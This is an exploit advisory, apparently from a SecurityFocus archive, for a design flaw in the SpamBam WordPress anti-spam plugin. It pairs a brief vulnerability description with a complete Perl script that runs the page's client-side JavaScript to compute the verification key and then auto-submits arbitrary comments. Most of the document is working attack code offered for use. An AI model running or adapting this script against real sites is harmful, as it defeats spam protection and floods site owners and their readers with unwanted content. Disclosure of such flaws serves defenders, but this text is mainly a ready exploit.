source: http://www.securityfocus.com/bid/27291/info

SpamBam is prone to a security-bypass vulnerability because client-accessible data can be used to calculate verification keys.

Attackers can exploit this issue to submit arbitrary form data via automated scripts and distribute spam.

#!/usr/bin/perl -w

# Defeating SpamBam exploit
# by Jose Palazon (josem.palazon@gmail.com) (a.k.a. palako)

# Vulnerable software:
# SpamBam (http://wordpress.org/extend/plugins/spambam/) by Gareth Heyes

# Vulnerability:
# No matter how hard you ofuscate or encrypt your code, never, under no 
circunstances, rely
# any security aspect on the client. Never!

# How the plugin works:
# It generates a pseudo-random code both on the client and the server to 
generate a key.
# On form submit, both key values are checked and they should match to 
allow comment insertion.

#How the exploit works:
# It does nothing but acting as a client. It parses the html, extracts 
the javascript, process it
# to calculate the key and fills the hidden field with it.

# Solution:
# Sorry guys but there's no fix for this. It'ss just a design flaw.

use WWW::Mechanize;
use JavaScript::SpiderMonkey;

my $tmpContent;
my $javascriptCode;
my $spamBamKey;

die ("Usage: spambam.pl <post url> <author> <email> <comment>\n") unless 
$ARGV[3];

my $url = $ARGV[0];
my $author = $ARGV[1];
my $email = $ARGV[2];
my $comment = $ARGV[3];

my $mech = WWW::Mechanize->new( autocheck => 1 );

$mech->get($url);

# WWW::Mechanize doesn't support javascript, so the field 
comment_spambamKey won't be
# recognized by $mech->field. Thus, I'll make an update_html adding the 
field, and for
# this purpose I save first the original contents. Indeed, substitition 
occurs via the
# javascript callback function "extractKey"
$tmpContent = $mech->content;


# Eliminate carriage returns to apply sed. Later I'll have to restore 
them
# to execute the javascript code, as not every line is semicolon 
terminated.
# That's the reason of the __WHO_BAMS_WHO__ string.
$_ = $mech->content;
s/\n/__WHO_BAMS_WHO__/g; 

# Extract the javascript code and the name of the variable where the key 
is going to be calculated
/<script type="text\/javascript">(.*)document\.write\('<input 
type="hidden" name="comment_spambamKey" value="'\+(.*)\+'">'\);/g; 
$javascriptCode = $1;
$spamBamKey = $2;

# Add the javascript instruction  which will comunicate the key to the 
perl code.
$javascriptCode .= "\nextractKey($spamBamKey);";

my $js = JavaScript::SpiderMonkey->new();
$js->init();  # Initialize Runtime/Context

# Define perl callback for extracting the key from the javascript code
$js->function_set("extractKey", sub { $tmpContent =~ s/<\/form>/<input 
type=\"hidden\" name=\"comment_spambamKey\" value=\"@_\"><\/form>/; });

# Restore Carriage returns and execute javascript code
$javascriptCode =~ s/__WHO_BAMS_WHO__/\n/g;
my $rc = $js->eval($javascriptCode); 
$js->destroy();

# Process form
$mech->update_html( $tmpContent );
$mech->form_number(1);
$mech->field("author", $author);
$mech->field("email", $email);
$mech->field("comment", $comment);
$mech->submit();

printf("Check it. Comment should have been added\n");